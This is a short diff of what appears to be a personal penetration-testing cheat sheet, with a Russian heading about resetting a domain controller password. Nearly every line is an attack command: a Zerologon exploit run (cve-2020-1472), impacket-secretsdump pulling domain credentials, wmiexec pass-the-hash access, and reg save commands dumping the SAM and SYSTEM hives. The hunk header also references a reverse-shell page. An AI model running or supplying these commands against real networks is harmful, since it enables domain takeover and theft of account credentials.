@@ -310,7 +310,7 @@ https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.ne
     
     сброс пароля DC
     python3 cve-2020-1472-exploit.py -n 'DC01$' -t 10.10.0.1
-    impacket-secretsdump -just-dc -no-pass fuse\DC1$@10.10.10.193
+    impacket-secretsdump -just-dc -no-pass domain.local/'DC1$'@192.168.56.107 -just-dc-user administrator
     python3 wmiexec.py -hashes <hash-value> 'domain.local/DC01$@10.10.0.1'
     reg save HKLM\SYSTEM system.save
     reg save HKLM\SAM sam.save
